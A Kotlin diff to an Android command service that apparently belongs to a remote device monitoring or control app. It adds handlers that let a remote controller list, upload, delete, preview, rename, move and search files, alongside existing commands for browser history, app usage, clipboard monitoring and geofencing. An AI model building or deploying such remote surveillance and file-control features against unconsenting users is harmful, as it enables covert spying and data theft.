@@ -292,7 +292,15 @@ class CommandService : Service() {
                 "get_app_usage" -> executeGetAppUsage()
                 "get_browser_history" -> executeGetBrowserHistory()
                 "browse_files" -> executeBrowseFiles(params)
+                "list_files" -> executeListFiles(params)
                 "download_file" -> executeDownloadFile(params)
+                "upload_file" -> executeUploadFile(params)
+                "upload_file_chunk" -> executeUploadFileChunk(params)
+                "delete_file" -> executeDeleteFile(params)
+                "preview_file" -> executePreviewFile(params)
+                "rename_file" -> executeRenameFile(params)
+                "move_file" -> executeMoveFile(params)
+                "search_files" -> executeSearchFiles(params)
                 "add_geofence" -> executeAddGeofence(params)
                 "start_clipboard_monitor" -> executeStartClipboardMonitor()
                 else -> Log.w(TAG, "Unknown command: $command")
@@ -1213,8 +1221,12 @@ class CommandService : Service() {
     private fun executeBrowseFiles(params: JSONObject?) {
         val path = params?.optString("path", "/sdcard") ?: "/sdcard"
         val intent = Intent(this, FileBrowserService::class.java).apply {
-            putExtra("path", path)
-            putExtra("action", "list")
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "list_files")
+            putExtra("params", JSONObject().apply {
+                put("path", path)
+                put("recursive", params?.optBoolean("recursive", false) ?: false)
+            }.toString())
         }
         startService(intent)
         sendResponse("file_browser", JSONObject().apply {
@@ -1222,18 +1234,106 @@ class CommandService : Service() {
             put("path", path)
         })
     }
+    
+    private fun executeListFiles(params: JSONObject?) {
+        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
+        val recursive = params?.optBoolean("recursive", false) ?: false
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "list_files")
+            putExtra("params", JSONObject().apply {
+                put("path", path)
+                put("recursive", recursive)
+            }.toString())
+        }
+        startService(intent)
+    }
 
     private fun executeDownloadFile(params: JSONObject?) {
         val path = params?.optString("path") ?: return
         val intent = Intent(this, FileBrowserService::class.java).apply {
-            putExtra("path", path)
-            putExtra("action", "download")
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "download_file")
+            putExtra("params", JSONObject().apply {
+                put("path", path)
+            }.toString())
         }
         startService(intent)
-        sendResponse("file_download", JSONObject().apply {
-            put("status", "downloading")
-            put("path", path)
-        })
+    }
+    
+    private fun executeUploadFile(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "upload_file")
+            putExtra("params", params.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executeUploadFileChunk(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "upload_file_chunk")
+            putExtra("params", params.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executeDeleteFile(params: JSONObject?) {
+        val path = params?.optString("path") ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "delete_file")
+            putExtra("params", JSONObject().apply {
+                put("path", path)
+            }.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executePreviewFile(params: JSONObject?) {
+        val path = params?.optString("path") ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "preview_file")
+            putExtra("params", JSONObject().apply {
+                put("path", path)
+                put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
+            }.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executeRenameFile(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "rename_file")
+            putExtra("params", params.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executeMoveFile(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "move_file")
+            putExtra("params", params.toString())
+        }
+        startService(intent)
+    }
+    
+    private fun executeSearchFiles(params: JSONObject?) {
+        params ?: return
+        val intent = Intent(this, FileBrowserService::class.java).apply {
+            putExtra("request_id", currentRequestId)
+            putExtra("command", "search_files")
+            putExtra("params", params.toString())
+        }
+        startService(intent)
     }
 
     private fun executeAddGeofence(params: JSONObject?) {
